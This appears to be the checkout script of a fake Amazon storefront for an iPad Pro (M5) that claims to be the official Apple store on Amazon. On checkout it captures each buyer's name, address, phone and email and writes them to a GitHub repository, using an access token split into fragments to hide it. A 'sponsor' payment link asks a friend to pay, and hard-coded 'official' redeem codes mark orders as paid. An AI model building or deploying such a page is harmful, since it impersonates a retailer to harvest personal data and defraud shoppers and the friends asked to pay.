/**
 * ipad-app.js
 * Amazon.com - Official Apple iPad Pro (M5) Flagship Showcase & Fluid Multi-Step Checkout
 * 100% Matching Standard Amazon Storefront Architecture & Design System
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "Apple iPad Pro (M5)",
  seller: "Apple Official Store on Amazon",
  colors: {
    "Space Black": {
      img: PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg",
      thumb: PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg",
      swatchClass: "swatch-space-black"
    },
    "Silver": {
      img: PATH_PREFIX + "images/ipad/ipad-pro-m5-silver.jpg",
      thumb: PATH_PREFIX + "images/ipad/ipad-pro-m5-silver.jpg",
      swatchClass: "swatch-silver"
    }
  },
  basePrice: 999,
  sizeAdd: { "11-inch": 0, "13-inch": 300 },
  storageAdd: { "256 GB": 0, "512 GB": 200, "1 TB": 600, "2 TB": 1000 },
  storageRam: { "256 GB": "12 GB", "512 GB": "12 GB", "1 TB": "16 GB", "2 TB": "16 GB" },
  glassAdd: { "Standard Glass": 0, "Nano-Texture Glass": 100 },
  connAdd: { "Wi-Fi": 0, "Wi-Fi + Cellular": 200 },
  nanoTextureEligible: ["1 TB", "2 TB"]
};

// Current Session State
const state = {
  size: "11-inch",
  color: "Space Black",
  storage: "256 GB",
  ram: "12 GB",
  glass: "Standard Glass",
  connectivity: "Wi-Fi",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  redeemCode: "AMZN-7K9W-M3XP-84QL",
  isRedeemApplied: false,
  placedOrder: null
};

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function calculateTotalPrice() {
  return PRODUCT.basePrice
    + (PRODUCT.sizeAdd[state.size] || 0)
    + (PRODUCT.storageAdd[state.storage] || 0)
    + (PRODUCT.glassAdd[state.glass] || 0)
    + (PRODUCT.connAdd[state.connectivity] || 0);
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/ipadprom5",
  filePath: "store/ipadprom5/orders.json",
  getAuth: function() {
    const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(b64) {
  const binary = atob((b64 || '').replace(/\s/g, ''));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let sha = undefined;
      let existingOrders = [];

      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (getRes.ok) {
        const fileData = await getRes.json();
        sha = fileData.sha;
        const decoded = base64ToUtf8(fileData.content);
        try {
          const parsed = JSON.parse(decoded);
          existingOrders = Array.isArray(parsed) ? parsed : (parsed ? [parsed] : []);
        } catch (e) {
          existingOrders = [];
        }
      }

      const orderExists = existingOrders.some(o => o.orderId === order.orderId);
      if (!orderExists) {
        existingOrders.unshift(order);
      }

      const updatedJson = JSON.stringify(existingOrders, null, 2);
      const base64Content = utf8ToBase64(updatedJson);

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Add order ${order.orderId} for ${order.buyerName || 'customer'}`,
          content: base64Content,
          sha: sha
        })
      });

      if (putRes.ok) {
        console.log(`[GitHub] Order successfully saved to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] SHA conflict on ${filePath}, retrying (attempt ${attempt + 1})...`);
        await new Promise(r => setTimeout(r, 600));
        continue;
      }

      const errText = await putRes.text();
      console.error(`[GitHub] Failed to write ${filePath}: ${putRes.status}`, errText);
      return false;
    } catch (err) {
      console.error(`[GitHub] Network error saving to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

// ==========================================================================
//  INITIALIZATION
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  setupProductOptions();
  setupBuyNow();
  setupCheckoutAccordion();
  setupOrdersDrawer();
  updateOrdersBadge();

  if (window.location.hash === "#checkout") {
    openCheckout(false);
  }
});

// ==========================================================================
//  1. PRODUCT OPTIONS & PRICING
// ==========================================================================
function setupProductOptions() {
  const mainPhoto = document.getElementById("mainProductPhoto");
  const thumbs = document.querySelectorAll("#thumbnailStrip .thumb-item");
  const swatches = document.querySelectorAll(".swatch-btn");
  const colorText = document.getElementById("currentColorText");
  const sizeText = document.getElementById("currentSizeText");
  const storageText = document.getElementById("currentStorageText");
  const ramText = document.getElementById("currentRamText");
  const glassText = document.getElementById("currentGlassText");
  const connText = document.getElementById("currentConnText");
  const centerPrice = document.getElementById("centerPrice");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const productTitle = document.getElementById("productTitle");
  const crumbDevice = document.getElementById("crumbDeviceName");
  const selectQty = document.getElementById("selectQty");
  const btnNanoTexture = document.getElementById("btnNanoTextureGlass");

  function updatePriceDisplay() {
    const unitPrice = calculateTotalPrice();
    const totalPrice = unitPrice * state.qty;

    if (centerPrice) centerPrice.textContent = unitPrice.toLocaleString("en-US");
    if (buyBoxPrice) buyBoxPrice.textContent = formatMoney(unitPrice);

    state.ram = PRODUCT.storageRam[state.storage] || "12 GB";

    if (colorText) colorText.textContent = state.color;
    if (sizeText) sizeText.textContent = state.size;
    if (storageText) storageText.textContent = state.storage;
    if (ramText) ramText.textContent = `(${state.ram} Unified RAM)`;
    if (glassText) glassText.textContent = state.glass;
    if (connText) connText.textContent = state.connectivity;

    const fullTitle = `Apple iPad Pro (M5, ${state.size} Ultra Retina XDR Tandem OLED, ${state.storage}) - ${state.color} (${state.glass}, ${state.connectivity})`;
    if (productTitle) productTitle.textContent = fullTitle;
    if (crumbDevice) crumbDevice.textContent = `Apple iPad Pro (M5, ${state.size})`;

    syncOrderSummary();
  }

  function updateNanoTextureEligibility() {
    const eligible = PRODUCT.nanoTextureEligible.includes(state.storage);
    if (btnNanoTexture) {
      if (eligible) {
        btnNanoTexture.classList.remove("disabled");
        btnNanoTexture.title = "Nano-Texture Glass (+$100)";
      } else {
        btnNanoTexture.classList.add("disabled");
        btnNanoTexture.title = "Available on 1 TB and 2 TB models";
        if (state.glass === "Nano-Texture Glass") {
          state.glass = "Standard Glass";
          document.querySelectorAll("#glassSelectorGroup .storage-choice").forEach(b => {
            b.classList.toggle("active", b.dataset.glass === "Standard Glass");
          });
        }
      }
    }
  }

  function setProductColor(colorName) {
    if (!PRODUCT.colors[colorName]) return;
    state.color = colorName;
    const colorObj = PRODUCT.colors[colorName];

    if (mainPhoto && colorObj.img) {
      mainPhoto.style.opacity = "0.3";
      setTimeout(() => {
        mainPhoto.src = colorObj.img;
        mainPhoto.style.opacity = "1";
      }, 150);
    }

    swatches.forEach(btn => {
      btn.classList.toggle("active", btn.dataset.color === colorName);
    });

    thumbs.forEach(t => {
      t.classList.toggle("active", t.dataset.color === colorName);
    });

    updatePriceDisplay();
  }

  // Color Swatches
  swatches.forEach(btn => {
    btn.addEventListener("click", () => {
      setProductColor(btn.dataset.color);
    });
  });

  // Thumbnails
  thumbs.forEach(thumb => {
    thumb.addEventListener("click", () => {
      thumbs.forEach(t => t.classList.remove("active"));
      thumb.classList.add("active");

      const c = thumb.dataset.color;
      if (c && PRODUCT.colors[c]) {
        setProductColor(c);
      } else if (thumb.dataset.img && mainPhoto) {
        mainPhoto.style.opacity = "0.3";
        setTimeout(() => {
          mainPhoto.src = thumb.dataset.img;
          mainPhoto.style.opacity = "1";
        }, 150);
      }
    });
  });

  // Display Size Choice Buttons
  document.querySelectorAll("#sizeSelectorGroup .storage-choice").forEach(btn => {
    btn.addEventListener("click", () => {
      document.querySelectorAll("#sizeSelectorGroup .storage-choice").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.size = btn.dataset.size;
      updatePriceDisplay();
    });
  });

  // Storage Choice Buttons
  document.querySelectorAll("#storageSelectorGroup .storage-choice").forEach(btn => {
    btn.addEventListener("click", () => {
      document.querySelectorAll("#storageSelectorGroup .storage-choice").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.storage = btn.dataset.storage;
      updateNanoTextureEligibility();
      updatePriceDisplay();
    });
  });

  // Display Glass Choice Buttons
  document.querySelectorAll("#glassSelectorGroup .storage-choice").forEach(btn => {
    btn.addEventListener("click", () => {
      if (btn.classList.contains("disabled")) {
        showToast("Nano-Texture Glass is available exclusively on 1 TB and 2 TB models.");
        return;
      }
      document.querySelectorAll("#glassSelectorGroup .storage-choice").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.glass = btn.dataset.glass;
      updatePriceDisplay();
    });
  });

  // Connectivity Choice Buttons
  document.querySelectorAll("#connSelectorGroup .storage-choice").forEach(btn => {
    btn.addEventListener("click", () => {
      document.querySelectorAll("#connSelectorGroup .storage-choice").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.connectivity = btn.dataset.conn;
      updatePriceDisplay();
    });
  });

  // Quantity Selector
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
      updatePriceDisplay();
    });
  }

  updateNanoTextureEligibility();
  updatePriceDisplay();
}

// ==========================================================================
//  2. NAVIGATION & "BUY NOW"
// ==========================================================================
function openCheckout(pushState = true) {
  const viewProduct = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const confScreen = document.getElementById("orderConfirmationScreen");

  const unit = calculateTotalPrice();
  const total = unit * state.qty;

  // Populate checkout item details
  const reviewTitle = document.getElementById("reviewItemTitle");
  const reviewQty = document.getElementById("reviewItemQty");
  const reviewPrice = document.getElementById("reviewItemPrice");
  const reviewPhoto = document.getElementById("reviewItemPhoto");

  if (reviewTitle) reviewTitle.textContent = `Apple iPad Pro (M5, ${state.size}, ${state.storage}) - ${state.color} (${state.glass}, ${state.connectivity})`;
  if (reviewQty) reviewQty.textContent = state.qty;
  if (reviewPrice) reviewPrice.textContent = formatMoney(total);
  if (reviewPhoto) reviewPhoto.src = PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg");

  syncOrderSummary();

  // Transition views
  if (confScreen) confScreen.classList.remove("active");
  const gridArea = document.getElementById("checkoutGridArea");
  if (gridArea) gridArea.style.display = "grid";
  if (viewProduct) viewProduct.style.display = "none";
  if (viewCheckout) viewCheckout.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  if (pushState) {
    try { history.pushState({ view: "checkout" }, "", "#checkout"); } catch (e) {}
  }
}

function returnToProduct(pushState = true) {
  const viewProduct = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const confScreen = document.getElementById("orderConfirmationScreen");

  if (confScreen) confScreen.classList.remove("active");
  const gridArea = document.getElementById("checkoutGridArea");
  if (gridArea) gridArea.style.display = "grid";
  if (viewCheckout) viewCheckout.classList.remove("active");
  if (viewProduct) viewProduct.style.display = "block";
  window.scrollTo({ top: 0, behavior: "smooth" });

  if (pushState && window.location.hash !== "") {
    try { history.pushState({ view: "product" }, "", window.location.pathname + window.location.search); } catch (e) {}
  }
}

function setupBuyNow() {
  const btnBuyNow = document.getElementById("btnBuyNow");
  const btnBackToProduct = document.getElementById("btnBackToProduct");
  const btnBackToProductPage = document.getElementById("btnBackToProductPage");
  const btnContinueShopping = document.getElementById("btnContinueShopping");
  const logoHomeLink = document.getElementById("logoHomeLink");

  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", () => openCheckout(true));
  }
  if (btnBackToProduct) {
    btnBackToProduct.addEventListener("click", () => returnToProduct(true));
  }
  if (btnBackToProductPage) {
    btnBackToProductPage.addEventListener("click", () => returnToProduct(true));
  }
  if (logoHomeLink) {
    logoHomeLink.addEventListener("click", (e) => {
      if (document.getElementById("viewCheckout")?.classList.contains("active") ||
          document.getElementById("orderConfirmationScreen")?.classList.contains("active")) {
        e.preventDefault();
        returnToProduct(true);
      }
    });
  }
  if (btnContinueShopping) {
    btnContinueShopping.addEventListener("click", () => {
      window.location.href = "../../";
    });
  }

  window.addEventListener("popstate", (e) => {
    const view = e.state?.view || (window.location.hash === "#checkout" ? "checkout" : (window.location.hash === "#confirmation" ? "confirmation" : "product"));
    if (view === "checkout") {
      openCheckout(false);
    } else if (view === "confirmation") {
      document.getElementById("checkoutGridArea").style.display = "none";
      document.getElementById("orderConfirmationScreen").classList.add("active");
      document.getElementById("viewProductPage").style.display = "none";
      document.getElementById("viewCheckout").classList.add("active");
    } else {
      returnToProduct(false);
    }
  });
}

// ==========================================================================
//  3. SYNC ORDER SUMMARY SIDEBAR
// ==========================================================================
function syncOrderSummary() {
  const unit = calculateTotalPrice();
  const total = unit * state.qty;
  const isRedeem = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  const csItemsPrice = document.getElementById("csItemsPrice");
  const csTotalBeforeTax = document.getElementById("csTotalBeforeTax");
  const csTotalPrice = document.getElementById("csTotalPrice");
  const csRedeemDiscountRow = document.getElementById("csRedeemDiscountRow");
  const csRedeemDiscountAmount = document.getElementById("csRedeemDiscountAmount");

  if (csItemsPrice) csItemsPrice.textContent = formatMoney(total);
  if (csTotalBeforeTax) csTotalBeforeTax.textContent = formatMoney(total);

  if (csRedeemDiscountRow && csRedeemDiscountAmount) {
    if (isRedeem) {
      csRedeemDiscountRow.style.display = "flex";
      csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
    } else {
      csRedeemDiscountRow.style.display = "none";
    }
  }

  if (csTotalPrice) {
    if (isRedeem) {
      csTotalPrice.innerHTML = `<span style="text-decoration:line-through; font-size:12px; color:#777; margin-right:6px;">${formatMoney(total)}</span> <span style="color:#007600; font-weight:700;">$0.00 (Paid in Full)</span>`;
    } else {
      csTotalPrice.textContent = formatMoney(total);
    }
  }
}

// ==========================================================================
//  4. MULTI-STEP ACCORDION CHECKOUT
// ==========================================================================
function setupCheckoutAccordion() {
  const OFFICIAL_AMAZON_REDEEM_CODES = [
    "AMZN-7K9W-M3XP-84QL",
    "AMZN-2026-PROMO-FULL",
    "AMZN-FULL-COVER-2026",
    "AMZN-GIFT-CARD-2026"
  ];

  function isValidAmazonRedeemCode(rawCode) {
    if (!rawCode) return false;
    const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
    return OFFICIAL_AMAZON_REDEEM_CODES.some(validCode => {
      return clean === validCode.replace(/[^A-Z0-9]/g, "");
    });
  }

  // --- Step 1: Address ---
  const addressForm = document.getElementById("addressForm");
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");

  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnEditPayment = document.getElementById("btnEditPayment");

  const stepCardReview = document.getElementById("stepCardReview");
  const stepReviewBody = document.getElementById("stepReviewBody");
  const btnBackToPayment = document.getElementById("btnBackToPayment");

  if (addressForm) {
    addressForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const fullName = (document.getElementById("inputFullName")?.value || "").trim();
      const deliveryAddress = (document.getElementById("inputDeliveryAddress")?.value || "").trim();
      const phone = (document.getElementById("inputPhone")?.value || "").trim();
      const email = (document.getElementById("inputEmail")?.value || "").trim();

      if (!fullName || !deliveryAddress) {
        showToast("Please fill in your name and delivery address.");
        return;
      }

      state.address = { fullName, deliveryAddress, phone, email };

      // Update location button in header
      const headerLoc = document.getElementById("headerLocText");
      if (headerLoc) headerLoc.textContent = fullName;

      // Collapse Step 1
      stepAddressSummary.innerHTML = `
        <strong>${fullName}</strong><br>
        ${deliveryAddress.replace(/\n/g, ', ')}<br>
        ${phone ? 'Phone: ' + phone : ''} ${email ? '&bull; Email: ' + email : ''}
      `;
      stepAddressSummary.style.display = "block";
      stepAddressBody.style.display = "none";
      btnEditAddress.style.display = "inline-block";
      stepCardAddress.classList.remove("active");

      // Open Step 2
      stepCardPayment.classList.add("active");
      stepPaymentBody.style.display = "block";
      stepPaymentSummary.style.display = "none";
      btnEditPayment.style.display = "none";
    });
  }

  if (btnEditAddress) {
    btnEditAddress.addEventListener("click", () => {
      stepAddressBody.style.display = "block";
      stepAddressSummary.style.display = "none";
      btnEditAddress.style.display = "none";
      stepCardAddress.classList.add("active");
    });
  }

  // --- Step 2: Payment Methods ---
  const paymentOptions = document.querySelectorAll(".payment-option:not(.disabled)");
  const boxRedeemInput = document.getElementById("boxRedeemInput");
  const inputRedeemCode = document.getElementById("inputRedeemCode");
  const btnApplyRedeemCode = document.getElementById("btnApplyRedeemCode");
  const redeemStatusMsg = document.getElementById("redeemStatusMsg");
  const badgeRedeemApplied = document.getElementById("badgeRedeemApplied");
  const btnSavePayment = document.getElementById("btnSavePayment");

  paymentOptions.forEach(opt => {
    opt.addEventListener("click", () => {
      paymentOptions.forEach(o => o.classList.remove("selected"));
      opt.classList.add("selected");
      const radio = opt.querySelector(".pay-radio");
      if (radio) {
        radio.checked = true;
        state.paymentMethod = radio.value;
      }

      if (state.paymentMethod === "Redeem Code") {
        if (boxRedeemInput) boxRedeemInput.style.display = "block";
      } else {
        if (boxRedeemInput) boxRedeemInput.style.display = "none";
      }
      syncOrderSummary();
    });
  });

  // Apply Redeem Code
  if (btnApplyRedeemCode && inputRedeemCode) {
    const applyRedeem = () => {
      const rawCode = inputRedeemCode.value.trim().toUpperCase();
      if (!rawCode) {
        if (redeemStatusMsg) {
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "Please enter your claim code (e.g. AMZN-7K9W-M3XP-84QL).";
        }
        return;
      }

      if (!isValidAmazonRedeemCode(rawCode)) {
        state.isRedeemApplied = false;
        state.redeemCode = "";
        if (badgeRedeemApplied) badgeRedeemApplied.style.display = "none";
        if (redeemStatusMsg) {
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "❌ The claim code you entered is invalid or expired.";
        }
        showToast("The claim code you entered is not valid.");
        syncOrderSummary();
        return;
      }

      const matchedCode = "AMZN-7K9W-M3XP-84QL";
      state.redeemCode = matchedCode;
      state.isRedeemApplied = true;
      inputRedeemCode.value = matchedCode;

      if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
      if (redeemStatusMsg) {
        redeemStatusMsg.style.color = "#007600";
        redeemStatusMsg.textContent = `✓ Code applied: ${matchedCode} (Covers 100% of order total)`;
      }
      showToast("✓ Amazon Redeem Code applied: Full order covered ($0.00 due)");
      syncOrderSummary();
    };

    btnApplyRedeemCode.addEventListener("click", (e) => {
      e.stopPropagation();
      applyRedeem();
    });
    inputRedeemCode.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        e.stopPropagation();
        applyRedeem();
      }
    });
  }

  if (btnSavePayment) {
    btnSavePayment.addEventListener("click", () => {
      if (state.paymentMethod === "Redeem Code" && !state.isRedeemApplied) {
        showToast("Please apply your Amazon Redeem Code before proceeding.");
        return;
      }

      // Collapse Step 2
      let summaryText = "";
      if (state.paymentMethod === "Ask a Friend to Pay") {
        summaryText = "<strong>🤝 Ask a Friend to Pay</strong> &bull; Sponsor payment link will be generated";
      } else if (state.paymentMethod === "Redeem Code") {
        summaryText = `<strong>🎟️ Amazon Redeem Code: ${state.redeemCode || 'AMZN-7K9W-M3XP-84QL'}</strong> &bull; Paid in full ($0.00 due)`;
      } else {
        summaryText = `<strong>${state.paymentMethod}</strong>`;
      }

      stepPaymentSummary.innerHTML = summaryText;
      stepPaymentSummary.style.display = "block";
      stepPaymentBody.style.display = "none";
      btnEditPayment.style.display = "inline-block";
      stepCardPayment.classList.remove("active");

      // Open Step 3
      stepCardReview.classList.add("active");
      stepReviewBody.style.display = "block";
    });
  }

  if (btnEditPayment) {
    btnEditPayment.addEventListener("click", () => {
      stepPaymentBody.style.display = "block";
      stepPaymentSummary.style.display = "none";
      btnEditPayment.style.display = "none";
      stepCardPayment.classList.add("active");
    });
  }

  if (btnBackToPayment) {
    btnBackToPayment.addEventListener("click", () => {
      stepPaymentBody.style.display = "block";
      stepPaymentSummary.style.display = "none";
      btnEditPayment.style.display = "none";
      stepCardPayment.classList.add("active");
      stepReviewBody.style.display = "none";
      stepCardReview.classList.remove("active");
    });
  }

  // --- Step 3 & Sidebar: Place Order ---
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");

  const handlePlaceOrder = () => {
    if (!state.address) {
      showToast("Please complete the shipping address section first.");
      stepAddressBody.style.display = "block";
      stepAddressSummary.style.display = "none";
      stepCardAddress.classList.add("active");
      window.scrollTo({ top: 0, behavior: "smooth" });
      return;
    }
    triggerPlaceOrder();
  };

  if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener("click", handlePlaceOrder);
  if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener("click", handlePlaceOrder);
}

// ==========================================================================
//  5. PLACE ORDER & CONFIRMATION
// ==========================================================================
function triggerPlaceOrder() {
  const btnFinal = document.getElementById("btnFinalPlaceOrder");
  const btnSummary = document.getElementById("btnSummaryPlaceOrder");

  if (btnFinal) { btnFinal.disabled = true; btnFinal.textContent = "Placing your order..."; }
  if (btnSummary) { btnSummary.disabled = true; btnSummary.textContent = "Placing your order..."; }

  setTimeout(() => {
    try {
      completeOrderPlacement();
    } finally {
      if (btnFinal) { btnFinal.disabled = false; btnFinal.textContent = "Place your order"; }
      if (btnSummary) { btnSummary.disabled = false; btnSummary.textContent = "Place your order"; }
    }
  }, 400);
}

async function completeOrderPlacement() {
  const unitPrice = calculateTotalPrice();
  const totalAmount = unitPrice * state.qty;
  const orderNumber = `114-${Math.floor(100000 + Math.random() * 900000)}-${Math.floor(100000 + Math.random() * 900000)}`;
  const orderDateFormatted = getDynamicOrderDate();

  const deliveryDateObj = new Date();
  deliveryDateObj.setDate(deliveryDateObj.getDate() + 5);
  const deliveryFormatted = deliveryDateObj.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });

  const fullItemTitle = `Apple iPad Pro (M5, ${state.size} Ultra Retina XDR Tandem OLED, ${state.storage}) - ${state.color} (${state.glass}, ${state.connectivity})`;

  const placedOrder = {
    orderId: orderNumber,
    orderDate: orderDateFormatted,
    expectedDelivery: deliveryFormatted,
    item: fullItemTitle,
    specs: `${state.size}, ${state.storage}, ${state.glass}, ${state.connectivity}`,
    color: state.color,
    storage: state.storage,
    size: state.size,
    glass: state.glass,
    connectivity: state.connectivity,
    quantity: state.qty,
    unitPrice: unitPrice,
    total: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? 0 : totalAmount,
    actualAmount: totalAmount,
    currency: "USD",
    buyerName: state.address ? state.address.fullName : "Customer",
    shippingAddress: state.address ? state.address.deliveryAddress : "Address provided",
    phone: state.address ? state.address.phone : "",
    email: state.address ? state.address.email : "",
    paymentMethod: state.paymentMethod,
    redeemCode: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? (state.redeemCode || "AMZN-7K9W-M3XP-84QL") : null,
    status: (state.paymentMethod === "Redeem Code" && state.isRedeemApplied)
      ? "Paid in full via Amazon Redeem Code"
      : "Awaiting payment by order sponsor",
    seller: PRODUCT.seller,
    storePath: "store/ipadprom5",
    image: PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/ipad/ipad-pro-m5-space-black.jpg")
  };

  state.placedOrder = placedOrder;

  // 1. Save to localStorage
  try {
    const existing = JSON.parse(localStorage.getItem("amazon_placed_orders_ipad") || "[]");
    existing.unshift(placedOrder);
    localStorage.setItem("amazon_placed_orders_ipad", JSON.stringify(existing));
  } catch (e) {
    console.error("Local storage error:", e);
  }

  // 2. Commit to GitHub repo
  saveOrderToAPI(placedOrder).catch(err => console.log("[GitHub] Commit background:", err));

  // 3. Populate Confirmation Screen
  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
  };

  safeSet("confOrderNumber", orderNumber);
  safeSet("confOrderDate", orderDateFormatted);
  safeSet("confEmailNotice", state.address ? state.address.email || "your email" : "your email");
  safeSet("confExpectedDelivery", deliveryFormatted);
  safeSet("trackerDeliveryDate", deliveryFormatted);
  safeSet("stepDateDelivered", deliveryDateObj.toLocaleDateString("en-US", { month: "short", day: "numeric" }));
  safeSet("confRecipientName", state.address ? state.address.fullName : "");
  safeSet("confFullAddress", state.address ? state.address.deliveryAddress : "");
  safeSet("confPhone", state.address ? state.address.phone : "");
  safeSet("confItemName", fullItemTitle);
  safeSet("confQty", state.qty);
  safeSet("confTotal", (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) ? "$0.00 (Paid in Full)" : formatMoney(totalAmount));
  safeSet("confPayMethod", state.paymentMethod === "Redeem Code"
    ? `Amazon Redeem Code (${state.redeemCode || 'AMZN-7K9W-M3XP-84QL'})`
    : state.paymentMethod);

  const friendBox = document.getElementById("confFriendNoticeBox");
  const redeemBox = document.getElementById("confRedeemNoticeBox");
  const payStatus = document.getElementById("confPaymentStatus");

  if (state.paymentMethod === "Redeem Code" && state.isRedeemApplied) {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "flex";
    if (payStatus) payStatus.textContent = "Status: Paid in full via Amazon Redeem Code";

    // Auto-download PDF receipt
    setTimeout(() => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(placedOrder);
      }
    }, 450);
  } else {
    if (friendBox) friendBox.style.display = "flex";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  }

  // Switch views
  const viewCheckout = document.getElementById("viewCheckout");
  if (viewCheckout) viewCheckout.classList.remove("active");
  const gridArea = document.getElementById("checkoutGridArea");
  if (gridArea) gridArea.style.display = "none";
  const confScreen = document.getElementById("orderConfirmationScreen");
  if (confScreen) confScreen.classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });

  try { history.pushState({ view: "confirmation" }, "", "#confirmation"); } catch (e) {}

  updateOrdersBadge();
  showToast("Order placed successfully! Check your email for confirmation.");
}

// ==========================================================================
//  6. ORDERS DRAWER & INVOICE MODAL
// ==========================================================================
function setupOrdersDrawer() {
  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoice = document.getElementById("btnCloseInvoiceModal");

  if (btnCloseInvoice && invoiceModal) {
    btnCloseInvoice.addEventListener("click", () => {
      invoiceModal.style.display = "none";
    });
    invoiceModal.addEventListener("click", (e) => {
      if (e.target === invoiceModal) invoiceModal.style.display = "none";
    });
  }

  const btnDownloadReceipt = document.getElementById("btnDownloadReceiptBtn");
  if (btnDownloadReceipt) {
    btnDownloadReceipt.addEventListener("click", () => {
      if (state.placedOrder) {
        if (typeof window.downloadOrderInvoicePdf === "function") {
          window.downloadOrderInvoicePdf(state.placedOrder);
        } else {
          openInvoiceModal(state.placedOrder);
        }
      }
    });
  }

  const btnModalDl = document.getElementById("btnModalDownloadPdf");
  if (btnModalDl) {
    btnModalDl.addEventListener("click", () => {
      if (state.placedOrder && typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(state.placedOrder);
      }
    });
  }

  const footerTrigger = document.getElementById("footerAdminTrigger");
  if (footerTrigger) {
    footerTrigger.addEventListener("click", () => {
      window.location.href = "../../orders/?admin=1";
    });
  }
}

function updateOrdersBadge() {
  try {
    const orders = JSON.parse(localStorage.getItem("amazon_placed_orders_ipad") || "[]");
    const badge = document.getElementById("navOrdersBadge");
    if (badge) {
      if (orders.length > 0) {
        badge.textContent = orders.length;
        badge.style.display = "inline-flex";
      } else {
        badge.style.display = "none";
      }
    }
  } catch (e) {}
}

function openInvoiceModal(ord) {
  const modal = document.getElementById("invoiceModalBackdrop");
  const content = document.getElementById("invoicePrintContent");
  if (!modal || !content) return;

  if (typeof window.generateInvoiceHtml === "function") {
    content.innerHTML = window.generateInvoiceHtml(ord);
  }

  const btnDl = document.getElementById("btnModalDownloadPdf");
  if (btnDl) {
    btnDl.onclick = () => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(ord);
      }
    };
  }

  modal.style.display = "flex";
}

// ==========================================================================
